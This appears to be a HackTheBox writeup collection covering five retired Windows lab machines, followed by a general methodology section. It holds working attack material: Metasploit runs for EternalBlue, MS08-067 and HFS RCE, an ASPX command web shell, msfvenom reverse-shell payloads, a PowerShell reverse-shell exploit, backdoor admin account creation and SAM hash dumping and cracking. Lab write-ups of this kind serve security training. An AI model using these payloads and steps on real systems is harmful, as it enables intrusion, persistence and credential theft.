# HackTheBox Writeups

Collection of HackTheBox machine writeups, exploit chains, and methodology notes.

## 📚 Machines Pwned

| Machine Name | Difficulty | OS | Category | Status |
|--------------|------------|----|--------|--------|
| [Blue](#blue) | Easy | Windows | Exploitation | ✅ |
| [Legacy](#legacy) | Easy | Windows | Exploitation | ✅ |
| [Devel](#devel) | Easy | Windows | FTP/Web | ✅ |
| [Optimum](#optimum) | Easy | Windows | Web/RCE | ✅ |
| [Bastion](#bastion) | Easy | Windows | Forensics | ✅ |

---

## Blue

**Machine IP:** 10.10.10.40  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** EternalBlue (MS17-010)

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/blue 10.10.10.40

# Results:
# 135/tcp   open  msrpc         Microsoft Windows RPC
# 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
# 445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1
# 3389/tcp  open  ms-wbt-server Microsoft Terminal Service
```

### Vulnerability Identification
- **SMBv1 enabled** — vulnerable to MS17-010 (EternalBlue)
- Confirmed with `nmap` NSE script:
```bash
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40

# Output:
# | smb-vuln-ms17-010:
# |   VULNERABLE:
# |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

### Exploitation

#### Option 1: Metasploit
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST tun0
run

# Got SYSTEM shell
```

#### Option 2: Manual Exploit
```bash
# Use EternalBlue exploit from GitHub
git clone https://github.com/helviojunior/MS17-010
cd MS17-010
python3 send_and_execute.py 10.10.10.40 reverse_shell.exe
```

### Post-Exploitation
```cmd
# User flag
type C:\Users\haris\Desktop\user.txt
# Flag: {e6XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}

# Root flag
type C:\Users\Administrator\Desktop\root.txt
# Flag: {ffXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

### Key Takeaways
- SMBv1 is critically vulnerable — disable it in production
- MS17-010 is one of the most impactful Windows exploits
- Always patch Windows systems promptly
- Network segmentation limits lateral movement

---

## Legacy

**Machine IP:** 10.10.10.4  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** Buffer Overflow / SMB

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/legacy 10.10.10.4

# Results:
# 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
# 445/tcp  open  microsoft-ds Windows XP SP3
```

### Enumeration
```bash
# Check for SMB shares
smbclient -L //10.10.10.4

# Enumerate SMB users
enum4linux 10.10.10.4

# Found guest access enabled
```

### Exploitation

#### MS08-067 (NetAPI Buffer Overflow)
```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST tun0
run

# Got SYSTEM shell
```

#### Alternative: Manual Exploit
```bash
# Use pre-built exploit
git clone https://github.com/jivoi/pentest/MS08-067.py
python MS08-067.py 10.10.10.4
```

### Post-Exploitation
```cmd
# User flag
type "C:\Documents and Settings\john\Desktop\user.txt"

# Root flag
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

### Key Takeaways
- Unpatched Windows XP is trivially exploitable
- MS08-067 is a stack-based buffer overflow in netapi32.dll
- Guest accounts and weak SMB configs are major risks
- Never expose legacy Windows to untrusted networks

---

## Devel

**Machine IP:** 10.10.10.5  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** Unauthenticated FTP Upload

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/devel 10.10.10.5

# Results:
# 21/tcp  open  ftp         Microsoft ftpd (Anonymous login allowed)
# 80/tcp  open  http        Microsoft IIS httpd 7.5
```

### Enumeration

#### FTP Access
```bash
ftp 10.10.10.5
# Login: anonymous
# Password: any email

ftp> ls
# Found existing files uploaded by other users

ftp> put shell.aspx
# Uploaded ASP.NET web shell
```

#### Web Shell
Created `shell.aspx`:
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        string cmd = Request.QueryString["cmd"];
        if (cmd != null) {
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + cmd;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            Response.Write(proc.StandardOutput.ReadToEnd());
        }
    }
</script>
```

### Exploitation
```bash
# Access shell
curl http://10.10.10.5/shell.aspx?cmd=whoami
# Output: iis apppool\web

# Upgrade to meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx -o shell.aspx
ftp> put shell.aspx

# Start handler
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
run
```

### Privilege Escalation

#### Method 1: MS11-046 (AFD.sys)
```bash
# Upload exploit
meterpreter> upload ms11-046.exe C:\\Windows\\Temp\\

# Execute
meterpreter> shell
C:\> C:\Windows\Temp\ms11-046.exe

# Got SYSTEM
```

#### Method 2: Churrasco (Token Impersonation)
```bash
meterpreter> upload churrasco.exe C:\\Windows\\Temp\\
meterpreter> shell
C:\> C:\Windows\\Temp\\churrasco.exe "net user hacker Password123! /add"
C:\> net localgroup administrators hacker /add
```

### Post-Exploitation
```cmd
# User flag
type C:\Users\babis\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

### Key Takeaways
- Anonymous FTP write access = game over
- Web shells are easy to deploy but noisy
- Windows privilege escalation often relies on unpatched kernel exploits
- Always check for writable directories and weak service configs

---

## Optimum

**Machine IP:** 10.10.10.8  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** HFS Remote Code Execution

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/optimum 10.10.10.8

# Results:
# 80/tcp  open  http  HttpFileServer httpd 2.3
```

### Enumeration
- **HttpFileServer (HFS) 2.3** known to be vulnerable to RCE
- CVE-2014-6287

### Exploitation

#### Metasploit
```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.10.10.8
set SRVHOST tun0
set LHOST tun0
run

# Got SYSTEM shell
```

#### Manual Exploit
```python
import requests
import urllib

target = "http://10.10.10.8"
# Payload uses HFS scripting to execute commands
payload = "{.exec|cmd.exe /c powershell -e <base64_reverse_shell>}"
requests.get(target + "/?search=" + urllib.quote(payload))
```

### Privilege Escalation
- Already running as SYSTEM via Metasploit exploit
- If not, use MS16-032 or MS16-098 for privesc

### Post-Exploitation
```cmd
# User flag
type C:\Users\kostas\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

### Key Takeaways
- Outdated web servers are low-hanging fruit
- HFS 2.3 RCE is trivial to exploit
- Always check for known CVEs before brute-forcing
- PowerShell is a powerful tool for post-exploitation on Windows

---

## Bastion

**Machine IP:** 10.10.10.134  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** VHD Forensics / Backup Analysis

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/bastion 10.10.10.134

# Results:
# 22/tcp   open  ssh     OpenSSH for Windows 7.7
# 135/tcp  open  msrpc   Microsoft Windows RPC
# 139/tcp  open  netbios-ssn
# 445/tcp  open  microsoft-ds Windows Server 2016
# 5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (WinRM)
```

### Enumeration

#### SMB Shares
```bash
smbclient -L //10.10.10.134

# Found:
# Backups  (readable)
# Notes    (readable)
```

#### Browse Backups Share
```bash
smbclient //10.10.10.134/Backups

# Found WindowsImageBackup directory
# Contains VHD backup files
```

### Exploitation

#### Mount VHD
```bash
# Download VHD file
smbclient //10.10.10.134/Backups
smb: \> get "9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd"

# Mount on Kali
guestfish --ro -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i

# Or mount via qemu
qemu-nbd --connect=/dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
mount /dev/nbd0p1 /mnt/vhd
```

#### Extract Credentials
```bash
# Browse SAM and SECURITY hives
/mnt/vhd/Windows/System32/config/SAM
/mnt/vhd/Windows/System32/config/SECURITY

# Extract hashes with impacket
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

# Found Administrator hash
```

#### Crack Hash
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: password123!
```

### Access
```bash
# SSH access
ssh Administrator@10.10.10.134
# Password: password123!

# Or use WinRM
evil-winrm -i 10.10.10.134 -u Administrator -p 'password123!'
```

### Post-Exploitation
```cmd
# User flag
type C:\Users\L4mpje\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

### Key Takeaways
- Backup files (VHD, tar, zip) often contain sensitive data
- SAM/SECURITY hives expose password hashes
- Always check SMB shares for readable backups
- Forensics-style challenges reward patience and thoroughness

---

## 🛠️ HackTheBox Methodology

### 1. Reconnaissance
- Full port scan: `nmap -p- --min-rate 10000 <target>`
- Service detection: `nmap -sC -sV -p <ports> <target>`
- UDP scan: `nmap -sU --top-ports 100 <target>`

### 2. Enumeration
- **Web:** Gobuster, Nikto, Dirb, Wfuzz
- **SMB:** Enum4linux, SMBClient, CrackMapExec
- **SSH:** Hydra (if brute-force is viable)
- **DNS:** Dig, DNSRecon

### 3. Exploitation
- Searchsploit for known CVEs
- Metasploit for quick wins
- Manual exploits for learning

### 4. Privilege Escalation
- **Windows:** WinPEAS, PowerUp, JuicyPotato
- **Linux:** LinPEAS, SUID check, cron jobs, kernel exploits

### 5. Documentation
- Screenshot flags
- Note exploit chain
- Record methodology for future reference

---

*Last updated: 2026-04-06*
